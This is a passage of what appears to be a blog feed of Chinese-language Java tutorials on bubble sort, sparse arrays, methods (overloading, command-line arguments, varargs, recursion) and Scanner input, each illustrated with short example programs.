punctuation">;</span>          <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sort <span class="token operator">=</span> <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//对数组a使用自定义冒泡排序方法，并定义数组sort接收数组a</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>sort<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//打印数组sort</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//临时变量</span>        <span class="token comment">//外层循环，判断要走多少次</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//内层循环，比较两个数，第一个比第二个数大则交换位置</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token comment">//前一个比后一个大则交换位置</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>array<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>array<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                       temp <span class="token operator">=</span> array<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    array<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span>array<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    array<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> array<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*结果[1, 3, 5, 6, 23, 45, 232, 2387]*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10、稀疏数组"><a href="#10、稀疏数组" class="headerlink" title="10、稀疏数组"></a>10、稀疏数组</h2><ul><li>当一个数组中<strong>大部分元素为0</strong>，<strong>或者为同一值</strong>的数组时，可以使用<strong>稀疏数组</strong>来保存该数组；</li><li>稀疏数组的处理方式：<ul><li>记录数组一共几行几列，有多少个不同值</li><li>把具有<strong>不同值的元素</strong>和<strong>行、列、值</strong>记录在一个小规模数组中，从而缩小程序的规模</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//实例：二维数组和稀疏数组的转换</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayDemo06</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//创建一个二维数组11*11   0没有棋子， 1：黑棋 2：白棋</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        array1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        array1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        <span class="token comment">//输出原始数组</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"输出原始数组"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ints <span class="token operator">:</span> array1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> anInt <span class="token operator">:</span> ints<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>anInt<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"======================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//转换为稀疏数组保存</span>        <span class="token comment">//获取有效值</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">11</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>array1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    sum<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有效值个数为："</span><span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//创建一个稀疏数组</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>sum<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        array2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>        array2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>        array2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>        <span class="token comment">//遍历二维数组将非0值存放到稀疏数组</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> array1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>array1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    count<span class="token operator">++</span><span class="token punctuation">;</span>                    array2<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>                    array2<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>j<span class="token punctuation">;</span>                    array2<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>array1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//输出稀疏数组</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ints <span class="token operator">:</span> array2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> anInt <span class="token operator">:</span> ints<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>anInt<span class="token operator">+</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"======================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"还原稀疏数组"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>array2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>array2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">//给元素还原值</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            array3<span class="token punctuation">[</span>array2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>array2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> array2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//打印array3</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ints <span class="token operator">:</span> array3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> anInt <span class="token operator">:</span> ints<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>anInt<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.bilibili.com/video/BV12J41137hu">https://www.bilibili.com/video/BV12J41137hu</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java方法(Part-3)</title>
      <link href="/2022/03/03/java-fang-fa/"/>
      <url>/2022/03/03/java-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Java方法详解"><a href="#Java方法详解" class="headerlink" title="Java方法详解"></a>Java方法详解</h1><h2 id="1、什么是方法"><a href="#1、什么是方法" class="headerlink" title="1、什么是方法"></a>1、什么是方法</h2><ul><li><p>System.out.println</p><p>调用系统类<code>system</code>中的标准输出对象<code>out</code>中的<code>println</code>方法；</p></li><li><p>方法是语句的集合，他们在一起执行一个功能</p><ul><li>方法是解决一类问题的步骤的有序组合</li><li>方法包含于类或对象中</li><li>方法在程序中被创建，在其他地方被调用</li></ul></li></ul><h2 id="2、方法的定义和调用"><a href="#2、方法的定义和调用" class="headerlink" title="2、方法的定义和调用"></a>2、方法的定义和调用</h2><ul><li>Java 方法类似于其他语言的函数</li></ul><p><strong>方法定义：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">修饰符 返回值类型 方法名<span class="token punctuation">(</span>参数类型 参数名<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>方法体<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> 返回值； <span class="token punctuation">&#125;</span><span class="token comment">/*参数类型：形式参数：在方法调用时用于接收外界输入的数据实参：调用方法时实际传给方法的数据*/</span><span class="token comment">//return 终止方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法调用：</strong></p><ul><li><p>调用方法：<code>对象名.方法名(实参列表)</code></p></li><li><p>Java支持两种调用方法的方式，根据方法是否返回值来选择</p><ul><li><p>方法返回一个值时，方法调用通常被当做一个值</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> large <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>方法返回值时<code>void</code>，方法调用一定是一条语句</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h2 id="3、方法的重载"><a href="#3、方法的重载" class="headerlink" title="3、方法的重载"></a>3、方法的重载</h2><p><strong>重载</strong>：一个类中有<strong>相同方法名</strong>，但<strong>形参不同</strong>的<strong>方法</strong></p><p><strong>方法重载规则</strong></p><ul><li>方法名必须<strong>相同</strong></li><li>参数列表必须<strong>不同</strong>（个数不同、类型不同、参数排列顺序不同等）</li></ul><h2 id="4、命令传参"><a href="#4、命令传参" class="headerlink" title="4、命令传参"></a>4、命令传参</h2><ul><li>当希望<strong>运行一个程序时</strong>再传给他消息，这要靠传递<strong>命令行参数</strong>给<code>main()</code>函数实现。</li><li>在命令行需要找到包的路径进行加载</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//例：</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>jaa<span class="token punctuation">.</span>method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"arg["</span><span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"]="</span><span class="token operator">+</span>args<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*------------------------------------命令行：javac Demo01//编译java com.jaa.method.Demo01 hello world  //加载（需跳转到com同一路径下、并加包路径执行）---------------------------------------结果：arg[0]=helloarg[1]=world*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、可变参数</p><ul><li>Java支持传递<strong>同类型的可变参数</strong>给一个方法</li><li>在方法声明中，在<strong>指定参数类型后</strong>加一个省略号<code>(...)</code></li><li>一个方法中只能指定一个可变参数，他<strong>必须是方法的最后一个参数</strong>。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//例：</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo02</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Demo02</span> demo02 <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">Demo02</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        demo02<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*结果：135*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、递归"><a href="#5、递归" class="headerlink" title="5、递归"></a>5、递归</h2><p>递归结构包括两个部分：</p><ul><li>递归头：<strong>什么时候不调用自身方法</strong>；如果没有头，将陷入死循环。</li><li>递归体：<strong>什么时候需要调用自身方法</strong>。</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//阶乘计算</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo05</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> n<span class="token operator">*</span><span class="token function">f</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>时间和空间的消耗比较大；重复计算；调用栈溢出；尽量不使用递归</em></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.bilibili.com/video/BV12J41137hu">https://www.bilibili.com/video/BV12J41137hu</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java流程控制(Part-2)</title>
      <link href="/2022/03/02/java-liu-cheng-kong-zhi/"/>
      <url>/2022/03/02/java-liu-cheng-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java流程控制"><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h1><h2 id="1、用户交互Scanner"><a href="#1、用户交互Scanner" class="headerlink" title="1、用户交互Scanner"></a>1、用户交互Scanner</h2><p><strong>（1）我们通过Scanner类来获取用户的输入</strong></p><pre class="line-numbers language-none"><code class="language-none">Scanner S &#x3D; new Scanner(System.in);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>（2）</strong>通过Scanner类的<code>next</code>()与<code>nextLine()</code>方法<strong>获取</strong>输入的字符串，在读取前我们一般需要使用<code>hasNext()</code>与<code>hasNextLine()</code><strong>判断</strong>是否还有输入的数据：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//创建一个扫描器对象，用于接收键盘数据</span><span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"使用next方式接收："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断是否还有输入</span><span class="token keyword">if</span> <span class="token punctuation">(</span>scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//使用next方式接收</span>   <span class="token class-name">String</span> str <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"输出的内容为："</span> <span class="token operator">+</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3）Scanner对象</strong></p><p>​    <strong>next()</strong></p><ul><li>一定要读取到<strong>有效字符</strong>才可以结束输入；</li><li>对输入有效字符之前遇到的空白，<code>next()</code>会自动将其去掉。</li><li>只有输入有效字符后才能将其后面的空白作为<strong>分隔符</strong>或<strong>结束符</strong>。</li><li><strong><code>next()</code>不能得到带有空格的字符串。</strong></li></ul><p>​    <strong>nextLine()</strong></p><ul><li>以<code>Enter</code>为结束符，故<code>nextLine()</code>方法返回的是<strong>回车之前所有</strong>的字符</li><li>可以获得空白</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//判断控制台接收是否为整数</span><span class="token function">hasNextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//判断控制台接收是否为小数</span><span class="token function">hasNextFloat</span><span class="token 